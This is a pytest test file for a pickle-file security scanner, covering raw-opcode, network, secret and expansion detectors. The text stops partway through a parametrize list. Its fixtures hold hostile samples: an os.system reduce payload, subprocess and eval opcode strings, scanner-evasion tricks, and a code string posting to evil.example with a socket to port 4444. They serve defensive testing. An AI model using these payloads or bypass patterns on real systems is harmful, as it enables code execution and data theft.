from __future__ import annotations

import hashlib
import io
import os
import pickle
from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.pickle_scanner import (
    ALWAYS_DANGEROUS_FUNCTIONS,
    ALWAYS_DANGEROUS_MODULES,
    PickleScanner,
    _contains_any_jax_indicator,
    _hex_token_has_execution_seed,
    _is_dangerous_module,
    _is_legitimate_serialization_file,
    _looks_like_pickle,
    _pickle_opcode_summary,
    _rebuild_tensor_indicators_are_documentation_literals,
    is_suspicious_global,
)
from tests.helpers import create_mock_pytorch_zip

EXPECTED_SYSTEM_GLOBAL = "nt.system" if os.name == "nt" else "posix.system"
BYPASS_V4_REFERENCES_TEST_CASES: tuple[tuple[str, str, IssueSeverity], ...] = (
    ("ctypes", "CDLL", IssueSeverity.CRITICAL),
    ("ctypes", "cast", IssueSeverity.CRITICAL),
    ("cProfile", "run", IssueSeverity.CRITICAL),
    ("pdb", "run", IssueSeverity.CRITICAL),
    ("timeit", "timeit", IssueSeverity.CRITICAL),
    ("profile", "run", IssueSeverity.CRITICAL),
    ("_thread", "allocate_lock", IssueSeverity.CRITICAL),
    ("linecache", "getline", IssueSeverity.WARNING),
    ("logging.config", "listen", IssueSeverity.CRITICAL),
    ("zipimport", "zipimporter", IssueSeverity.CRITICAL),
)


class MaliciousPayload:
    def __reduce__(self) -> tuple[Any, tuple[str]]:
        return (os.system, ("id",))


class NonSeekableBytesIO(io.BytesIO):
    def seekable(self) -> bool:
        return False


class BrokenTellStream(io.BytesIO):
    def seekable(self) -> bool:
        return True

    def tell(self) -> int:
        raise OSError("tell failed")


def _short_binunicode(data: bytes) -> bytes:
    if len(data) > 0xFF:
        raise ValueError("SHORT_BINUNICODE helper accepts at most 255 bytes")
    return b"\x8c" + bytes([len(data)]) + data


def _binary_opcode_os_system_reduce_payload() -> bytes:
    # The command text is inert here; the scanner only needs a realistic GLOBAL/REDUCE payload shape.
    return _short_binunicode(b"os") + _short_binunicode(b"system") + b"\x93" + _short_binunicode(b"echo") + b"\x85R."


def _binary_opcode_stack_global_probe_decoy() -> bytes:
    return _short_binunicode(b"os") + _short_binunicode(b"system") + b"\x93Z"


def _global_reduce_payload(module: str, func: str) -> bytes:
    return b"\x80\x02c" + module.encode("utf-8") + b"\n" + func.encode("utf-8") + b"\n)R."


def _make_opcode_padding_stream(opcode_pairs: int) -> bytes:
    return b"\x80\x02" + (b"K\x010" * opcode_pairs) + b"."


def _make_pre_memoized_post_budget_stack_global_payload(tail: bytes) -> bytes:
    payload = bytearray(b"\x80\x04")
    payload += _short_binunicode(b"subprocess") + b"\x94"
    payload += _short_binunicode(b"run") + b"\x94"
    payload += b"\x880" * 4
    payload += tail
    return bytes(payload)


def _make_memo_expansion_pickle(iterations: int, *, inert_writes: int = 0) -> bytes:
    total_writes = iterations + inert_writes
    if not 1 <= iterations <= 255 or total_writes > 255:
        raise ValueError("iterations + inert_writes must fit in BINPUT/BINGET opcodes")

    payload = bytearray(b"\x80\x02)q\x000")
    for memo_index in range(1, iterations + 1):
        previous_index = memo_index - 1
        payload += b"h" + bytes([previous_index])
        payload += b"h" + bytes([previous_index])
        payload += b"\x86"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    for memo_index in range(iterations + 1, total_writes + 1):
        payload += b"K\x01"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    payload += b"h" + bytes([iterations]) + b"."
    return bytes(payload)


def _make_dup_heavy_pickle(iterations: int) -> bytes:
    payload = bytearray(b"\x80\x02]q\x00")
    for _ in range(iterations):
        payload += b"h\x002a0"
    payload += b"."
    return bytes(payload)


def test_pickle_scanner_star_import_exports_scanner_class() -> None:
    namespace: dict[str, object] = {}

    exec("from modelaudit.scanners.pickle_scanner import *", namespace)

    assert namespace["PickleScanner"] is PickleScanner


def test_looks_like_pickle_sniffs_binary_and_protocol_zero_payloads() -> None:
    assert _looks_like_pickle(pickle.dumps({"safe": True}, protocol=4)) is True
    assert _looks_like_pickle(b"\x80\x01K\x01.") is True
    assert _looks_like_pickle(b"cos\nsystem\n.") is True
    assert _looks_like_pickle(b"not a pickle") is False


def test_can_handle_accepts_raw_pickle_and_rejects_zip_container(tmp_path: Path) -> None:
    raw_pickle = tmp_path / "model.pkl"
    raw_pickle.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    zip_pickle = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=False)

    assert PickleScanner.can_handle(str(raw_pickle)) is True
    assert PickleScanner.can_handle(str(zip_pickle)) is False


def test_scan_safe_pickle_uses_rust_engine_and_preserves_integrity_metadata(tmp_path: Path) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["file_size"] == path.stat().st_size
    assert result.metadata["file_hashes"]["sha256"]
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]


def test_scan_directory_reports_operational_error_without_critical_issue(tmp_path: Path) -> None:
    result = PickleScanner().scan(str(tmp_path))

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "path_is_directory"
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        issue.message == "Path is a directory, not a pickle file" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )


def test_scan_large_low_information_pickle_skips_expensive_raw_detectors(tmp_path: Path) -> None:
    path = tmp_path / "large-safe.pkl"
    path.write_bytes(pickle.dumps({"blob": "A" * (2 * 1024 * 1024)}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_expensive_raw_detector_skip_reason"] == "rust_complete_clean_no_expensive_raw_seeds"


def test_expensive_raw_skip_requires_clean_complete_rust_result() -> None:
    scanner = PickleScanner()
    clean_result = ScanResult(scanner_name="pickle")
    clean_result.metadata.update({"pickle_report_status": "complete", "pickle_verdict": "clean"})
    suspicious_result = ScanResult(scanner_name="pickle")
    suspicious_result.metadata.update({"pickle_report_status": "complete", "pickle_verdict": "suspicious"})

    assert scanner._should_skip_expensive_raw_detectors(clean_result, b"A" * 128) is True
    assert scanner._should_skip_expensive_raw_detectors(suspicious_result, b"A" * 128) is False


def test_data_only_nested_pickle_notice_is_modelaudit_issue(tmp_path: Path) -> None:
    path = tmp_path / "nested-data.pkl"
    inner_payload = pickle.dumps({"tiny": "payload"}, protocol=4)
    path.write_bytes(pickle.dumps({"data": inner_payload}, protocol=4))

    result = PickleScanner().scan(str(path))

    nested_issues = [
        issue
        for issue in result.issues
        if issue.rule_code == "S213" and issue.details.get("pickle_notice_code") == "nested_payload_detected"
    ]
    assert nested_issues
    assert nested_issues[0].severity == IssueSeverity.CRITICAL


def test_expensive_raw_prefilter_emits_network_pass_for_clean_pickle(tmp_path: Path) -> None:
    path = tmp_path / "clean.pkl"
    path.write_bytes(pickle.dumps({"model_state": {"layer.weight": [1.0, 2.0, 3.0]}}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    network_passes = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection"
        and check.message == "No network communication patterns detected"
    ]
    assert len(network_passes) == 1


def test_native_findings_do_not_suppress_network_raw_detector(tmp_path: Path) -> None:
    path = tmp_path / "network-code.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "code": b"""
import socket
import requests

requests.post('http://evil.example/steal')
socket.connect(('192.168.1.100', 4444))
""",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    network_issues = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status.value == "failed"
    ]
    assert network_issues
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_secret_and_network_findings(tmp_path: Path) -> None:
    path = tmp_path / "seeded.pkl"
    payload = {
        "token": "sk-" + ("A" * 48),
        "endpoint": "https://attacker.example/cmd",
    }
    path.write_bytes(pickle.dumps(payload, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_secrets_raw_detector_skipped")
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_bare_alpha_domain_findings(tmp_path: Path) -> None:
    path = tmp_path / "bare-domain.pkl"
    path.write_bytes(pickle.dumps({"endpoint": "attacker.example/model"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_expensive_raw_prefilters_skip_plain_key_substrings(tmp_path: Path) -> None:
    path = tmp_path / "plain-key.pkl"
    path.write_bytes(pickle.dumps({"key": "value"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True


def test_expensive_raw_prefilters_skip_generic_secret_words_without_values(tmp_path: Path) -> None:
    path = tmp_path / "generic-secret-words.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "apigateway": "metadata",
                "use_auth_token": False,
                "secret_key": "not a secret value",
                "password_policy": "disabled in fixture metadata",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True


def test_expensive_raw_prefilters_skip_huggingface_style_metadata_without_values(tmp_path: Path) -> None:
    path = tmp_path / "hf-style-metadata.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "__version__": "4.37.0",
                "auto_map": {"AutoModelForCausalLM": "modeling_llama.LlamaForCausalLM"},
                "use_auth_token": None,
                "api_key": None,
                "state_dict": "A" * (2 * 1024 * 1024),
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert not result.issues


def test_expensive_raw_prefilters_skip_common_torch_metadata_without_jit_markers(tmp_path: Path) -> None:
    path = tmp_path / "torch-metadata.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "__version__": "2.3.0",
                "framework": "torch",
                "torch_dtype": "float16",
                "architectures": ["LlamaForCausalLM"],
                "state_dict": "A" * (2 * 1024 * 1024),
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert not result.issues


def test_expensive_raw_prefilters_skip_realistic_torch_state_dict_names(tmp_path: Path) -> None:
    path = tmp_path / "torch-state-dict.pkl"
    state_dict = {f"torch.layer.{index}.weight": index / 100.0 for index in range(20_000)}
    path.write_bytes(pickle.dumps(state_dict, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_expensive_raw_detector_skip_reason"] == "rust_complete_clean_no_expensive_raw_seeds"
    assert result.metadata.get("pickle_secrets_raw_detector_skipped") is None
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is None
    assert result.metadata.get("pickle_network_raw_detector_skipped") is None
    assert result.metadata["pickle_raw_text_detector_skipped"] is True
    assert result.metadata["pickle_cve_raw_detector_skipped"] is True
    assert not result.issues


def test_raw_prefilters_skip_review_style_state_dict_without_detector_seeds(tmp_path: Path) -> None:
    path = tmp_path / "review-style-state-dict.pkl"
    state_dict = {f"model.layers.{index}.self_attn.q_proj.weight": index / 100.0 for index in range(50_000)}
    path.write_bytes(pickle.dumps(state_dict, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
    assert result.metadata["pickle_raw_text_detector_skipped"] is True
    assert result.metadata["pickle_cve_raw_detector_skipped"] is True
    assert result.metadata.get("pickle_secrets_raw_detector_skipped") is None
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is None
    assert result.metadata.get("pickle_network_raw_detector_skipped") is None
    assert not result.issues


def test_expensive_raw_prefilters_preserve_torch_jit_markers(tmp_path: Path) -> None:
    path = tmp_path / "torch-jit-metadata.pkl"
    path.write_bytes(pickle.dumps({"loader": "torch.jit.load('model.pt')"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.metadata.get("pickle_expensive_raw_detectors_skipped") is not True
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is not True


def test_expensive_raw_prefilters_detect_embedded_python_payloads(tmp_path: Path) -> None:
    path = tmp_path / "embedded-python.pkl"
    path.write_bytes(
        pickle.dumps(
            {
                "blob": b"def payload():\n    import os\n    return os.system('id')\n",
            },
            protocol=4,
        )
    )

    result = PickleScanner().scan(str(path))

    assert result.metadata.get("pickle_expensive_raw_detectors_skipped") is not True
    assert result.metadata.get("pickle_jit_raw_detector_skipped") is not True
    assert any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_expensive_raw_prefilters_preserve_structured_secret_assignments(tmp_path: Path) -> None:
    path = tmp_path / "structured-secret.pkl"
    path.write_bytes(pickle.dumps({"env": "password=CorrectHorseBattery42"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert not result.metadata.get("pickle_secrets_raw_detector_skipped")


def test_expensive_raw_prefilters_preserve_bare_ipv4_network_findings(tmp_path: Path) -> None:
    path = tmp_path / "bare-ipv4.pkl"
    path.write_bytes(pickle.dumps({"callback": "192.168.1.100"}, protocol=4))

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Network Communication Detection" for check in result.checks)
    assert not result.metadata.get("pickle_network_raw_detector_skipped")


def test_scan_malicious_pickle_reports_rust_finding(tmp_path: Path) -> None:
    path = tmp_path / "evil.pkl"
    path.write_bytes(pickle.dumps(MaliciousPayload(), protocol=4))

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_nested_probe_limit_operational_semantics_and_cache_policy(tmp_path: Path) -> None:
    path = tmp_path / "probe-limit.pkl"
    cache_dir = tmp_path / "cache"
    path.write_bytes(
        pickle.dumps(
            {"blob": (_binary_opcode_stack_global_probe_decoy() * 64) + _binary_opcode_os_system_reduce_payload()},
            protocol=4,
        )
    )

    direct_result = PickleScanner().scan(str(path))

    assert direct_result.success is False
    assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct_result.metadata["scan_outcome_reasons"] == ["nested_probe_limit"]
    assert direct_result.metadata["analysis_incomplete"] is True
    assert any(
        issue.message == "Nested pickle probe candidate limit exceeded"
        and issue.severity == IssueSeverity.CRITICAL
        and issue.rule_code == "S213"
        for issue in direct_result.issues
    )
    assert any(
        check.name == "Standalone Pickle Notice"
        and check.message == "Nested pickle probe candidate limit exceeded"
        and check.rule_code == "S902"
        for check in direct_result.checks
    )

    reset_cache_manager()
    try:
        aggregate_result = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        metadata = aggregate_result.file_metadata[str(path)]

        assert aggregate_result.success is True
        assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert metadata["scan_outcome_reasons"] == ["nested_probe_limit"]
        assert determine_exit_code(aggregate_result) == 1
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_stream_treats_negative_size_as_unknown_size() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), -1, source="unknown-size.pkl")

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"
    assert not result.metadata.get("operational_error")


def test_scan_stream_runs_root_raw_detectors_for_seekable_stream() -> None:
    payload = pickle.dumps({"script": "os.system('id')"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="stream-raw.pkl")

    assert any(issue.details.get("source") == "bounded_raw_pickle_window" for issue in result.issues)


@pytest.mark.parametrize(
    ("encoded", "pattern"),
    [
        ("b3Muc3lzdGVtKCdpZCcp", "os.system"),
        ("ZXZhbCh4KQ==", "eval"),
    ],
)
def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern: str) -> None:
    payload = pickle.dumps({"encoded": encoded}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="encoded-raw.pkl")

    encoded_issues = [
        issue
        for issue in result.issues
        if issue.message.startswith("Encoded pickle content decodes to dangerous code pattern")
    ]
    assert [issue.rule_code for issue in encoded_issues] == ["S604"]
    assert encoded_issues[0].details["pattern"] == pattern
    assert encoded_issues[0].details["legacy_rule_aliases"] == ["S104"]
    assert not any(issue.message.startswith("Legacy encoded dangerous pattern detected") for issue in result.issues)


def test_hex_token_seed_gate_reuses_lowered_token() -> None:
    class CountingBytes(bytes):
        lower_calls = 0

        def lower(self) -> bytes:
            type(self).lower_calls += 1
            return super().lower()

    assert _hex_token_has_execution_seed(CountingBytes(b"AA" * 4096)) is False
    assert CountingBytes.lower_calls == 1


def test_scan_stream_detects_pem_private_key_after_seed_tightening() -> None:
    payload = pickle.dumps(
        {"pem": "-----BEGIN RSA PRIVATE KEY-----\nabc123\n-----END RSA PRIVATE KEY-----"},
        protocol=4,
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="pem-secret.pkl")

    assert any(issue.rule_code == "S703" and "Private Key" in str(issue.details) for issue in result.issues)


def test_scan_stream_hashes_seekable_stream_past_raw_scan_window() -> None:
    payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        io.BytesIO(payload),
        len(payload),
        source="large-seekable-stream.pkl",
    )

    integrity_checks = [check for check in result.checks if check.name == "File Integrity Check"]
    assert integrity_checks
    assert integrity_checks[-1].details["bytes_hashed"] == len(payload)
    assert integrity_checks[-1].details["hash_complete"] is True
    assert result.metadata["file_hashes"]["sha256"] == hashlib.sha256(payload).hexdigest()


def test_scan_stream_preserves_legacy_raw_eval_exec_importlib_detection() -> None:
    payload = pickle.dumps({"script": "eval # inline\n(1); exec\t(x); import importlib"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-code.pkl")

    critical_messages = [issue.message for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert any("eval" in message for message in critical_messages)
    assert any("exec" in message for message in critical_messages)
    assert any("importlib" in message for message in critical_messages)
    assert any(issue.rule_code == "S104" for issue in result.issues)


def test_scan_stream_deduplicates_legacy_raw_eval_exec_import_patterns() -> None:
    payload = pickle.dumps({"script": "eval(1); exec(x); __import__('os')"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-code-dedupe.pkl")

    raw_builtin_issues = [
        issue
        for issue in result.issues
        if issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") in {"builtins.eval", "builtins.exec", "builtins.__import__"}
    ]

    assert len(raw_builtin_issues) == 3
    assert {issue.details["associated_global"] for issue in raw_builtin_issues} == {
        "builtins.eval",
        "builtins.exec",
        "builtins.__import__",
    }
    assert {issue.details["associated_global"]: issue.rule_code for issue in raw_builtin_issues} == {
        "builtins.eval": "S104",
        "builtins.exec": "S104",
        "builtins.__import__": "S106",
    }


@pytest.mark.parametrize("separator", ["\x00", "\\\n", ";", "/* comment */"])
def test_scan_stream_detects_legacy_raw_eval_with_obscured_separator(separator: str) -> None:
    payload = pickle.dumps({"script": f"eval{separator}(1)"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-eval-separator.pkl")

    assert any(
        issue.rule_code == "S104" and issue.details.get("associated_global") == "builtins.eval"
        for issue in result.issues
    )


def test_scan_stream_does_not_flag_importlib_comment_as_critical() -> None:
    payload = pickle.dumps(
        {"documentation": "This model does not use importlib# Safe comment", "config": {"safe": True}},
        protocol=4,
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="comment.pkl")

    assert not any(
        issue.severity == IssueSeverity.CRITICAL and "importlib" in issue.message.lower() for issue in result.issues
    )


def test_scan_stream_does_not_flag_primarily_documentation_raw_text() -> None:
    payload = (
        b"V# eval(1)\n"
        b"# exec(2)\n"
        b"# os.system('id')\n"
        b"# importlib.import_module('os')\n"
        b"# subprocess.run('id')\n"
        b"plain note\n."
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="comment-doc.pkl")

    assert not any(issue.details.get("source") == "bounded_raw_pickle_window" for issue in result.issues)


def test_scan_stream_documentation_padding_does_not_suppress_raw_structural_evidence() -> None:
    payload = (b"# documentation line\n" * 32) + b"cposix\nsystem\n."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="doc-padded-evil.pkl")

    assert any(
        issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") in {"os.system", "posix.system", "nt.system"}
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (b"cos\npopen\n.", "os.popen"),
        (b"cos\nspawnv\n.", "os.spawnv"),
        (b"cposix\npopen\n.", "posix.popen"),
        (b"csubprocess\nPopen\n.", "subprocess.Popen"),
        (b"ccommands\ngetoutput\n.", "commands.getoutput"),
    ],
)
def test_scan_stream_detects_protocol0_global_newline_raw_references(
    payload: bytes,
    expected_reference: str,
) -> None:
    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="protocol0-global.pkl")

    assert any(
        issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") == expected_reference
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("payload_tail", "expected_reference"),
    [
        (b"cpip\nmain\n)R.", "pip.main"),
        (b"c__main__\nEvil\n)R.", "__main__.Evil"),
        (b"ctorch\nload\n)R.", "torch.load"),
        (b"cbuiltins\neval\n)R.", "builtins.eval"),
        (b"cbuiltins\nexec\n)R.", "builtins.exec"),
        (b"cdill\nloads\n)R.", "dill.loads"),
    ],
)
def test_comment_token_does_not_bypass_dangerous_reduce_detection(
    tmp_path: Path,
    payload_tail: bytes,
    expected_reference: str,
) -> None:
    comment_prefix = _short_binunicode(b"# benign comment token") + b"0"
    path = tmp_path / f"{expected_reference.replace('.', '_')}_comment_reduce.pkl"
    path.write_bytes(b"\x80\x02" + comment_prefix + payload_tail)

    result = PickleScanner().scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("associated_global") == expected_reference
        and issue.details.get("opcode") == "REDUCE"
        for issue in result.issues
    ), (
        f"Expected {expected_reference} detection despite comment token, "
        f"got: {[issue.message for issue in result.issues]}"
    )


def test_comment_token_does_not_bypass_main_stack_global_detection(tmp_path: Path) -> None:
    comment_prefix = _short_binunicode(b"# benign comment token") + b"0"
    path = tmp_path / "main_stack_global_comment.pkl"
    path.write_bytes(
        b"\x80\x04" + comment_prefix + _short_binunicode(b"__main__") + _short_binunicode(b"CustomType") + b"\x93."
    )

    result = PickleScanner().scan(str(path))

    assert any(
        issue.severity == IssueSeverity.WARNING
        and issue.details.get("associated_global") == "__main__.CustomType"
        and issue.details.get("opcode") == "STACK_GLOBAL"
        for issue in result.issues
    ), (
        "Expected __main__ STACK_GLOBAL warning despite comment token, "
        f"got: {[issue.message for issue in result.issues]}"
    )


@pytest.mark.parametrize(("module", "func", "expected_severity"), BYPASS_V4_REFERENCES_TEST_CASES)
def test_bypass_v4_references_still_detected(
    module: str,
    func: str,
    expected_severity: IssueSeverity,
) -> None:
    full_ref = f"{module}.{func}"
    payload = _global_reduce_payload(module, func)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="bypass-v4-regression.pkl")

    matched = [
        issue
        for issue in result.issues
        if issue.severity == expected_severity
        and (issue.details.get("associated_global") == full_ref or full_ref in issue.message)
    ]
    assert result.success is True, f"Scan failed for {full_ref}: {result.metadata}"
    assert matched, (
        f"Expected {expected_severity.value} finding for {full_ref}, "
        f"got: {[(issue.severity.value, issue.message, issue.details) for issue in result.issues]}"
    )


def test_pickle_expansion_heuristics_detect_iterative_memo_growth(tmp_path: Path) -> None:
    path = tmp_path / "memo-expansion.pkl"
    path.write_bytes(_make_memo_expansion_pickle(iterations=80))

    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    check = expansion_checks[0]
    assert check.severity == IssueSeverity.WARNING
    assert check.rule_code == "S214"
    assert any("memo_growth_chain" in finding["triggers"] for finding in check.details["findings"]), check.details


def test_pickle_expansion_heuristics_detect_diluted_memo_growth(tmp_path: Path) -> None:
    path = tmp_path / "memo-expansion-diluted.pkl"
    path.write_bytes(_make_memo_expansion_pickle(iterations=80, inert_writes=80))

    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    assert any("memo_growth_chain" in finding["triggers"] for finding in expansion_checks[0].details["findings"]), (
        expansion_checks[0].details
    )


def test_pickle_expansion_heuristics_detect_dup_heavy_payload(tmp_path: Path) -> None:
    path = tmp_path / "dup-heavy.pkl"
    path.write_bytes(_make_dup_heavy_pickle(iterations=200))

    loaded = pickle.loads(path.read_bytes())
    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    assert len(loaded) == 200
    assert loaded[0] is loaded
    triggers = expansion_checks[0].details["findings"][0]["triggers"]
    assert "excessive_dup_usage" in triggers
    assert "suspicious_get_put_ratio" in triggers


def test_pickle_expansion_heuristics_ignore_benign_shared_reference_payload(tmp_path: Path) -> None:
    shared = [1, 2, 3]
    path = tmp_path / "shared-reference.pkl"
    path.write_bytes(pickle.dumps([shared] * 1000, protocol=4))

    result = PickleScanner().scan(str(path))

    assert not any(
        check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed" for check in result.checks
    ), f"Unexpected expansion heuristic finding: {result.checks}"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_post_budget_expansion_scan_detects_follow_on_stream(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-expansion.pkl"
    path.write_bytes(_make_opcode_padding_stream(64) + _make_memo_expansion_pickle(iterations=80))

    result = PickleScanner({"max_opcodes": 64, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    post_budget_checks = [
        check
        for check in result.checks
        if check.name == "Post-Budget Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(post_budget_checks) == 1, f"Expected one failed post-budget expansion check, got: {result.checks}"
    assert post_budget_checks[0].rule_code == "S214"
    assert any("memo_growth_chain" in finding["triggers"] for finding in post_budget_checks[0].details["findings"]), (
        post_budget_checks[0].details
    )


def test_post_budget_expansion_scan_ignores_benign_follow_on_stream(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-benign.pkl"
    path.write_bytes(_make_opcode_padding_stream(64) + pickle.dumps({"safe": True}, protocol=2))

    result = PickleScanner({"max_opcodes": 64, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert not any(
        check.name == "Post-Budget Pickle Expansion Heuristic Check" and check.status.value == "failed"
        for check in result.checks
    ), result.checks


def test_post_budget_scan_detects_prememoized_stack_global_tail(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-prememo-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(b"h\x00h\x01\x93)R."))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00" + _short_binunicode(b"run") + b"\x93)R.",
        _short_binunicode(b"subprocess") + b"h\x01\x93)R.",
    ],
    ids=["memo-module-inline-name", "inline-module-memo-name"],
)
def test_post_budget_scan_detects_mixed_prememoized_stack_global_tail(tmp_path: Path, tail: bytes) -> None:
    path = tmp_path / "post-budget-prememo-mixed-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(tail))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00h\x0120\x93)R.",
        b"h\x00(0h\x01\x93)R.",
        b"h\x00N0h\x01\x93)R.",
    ],
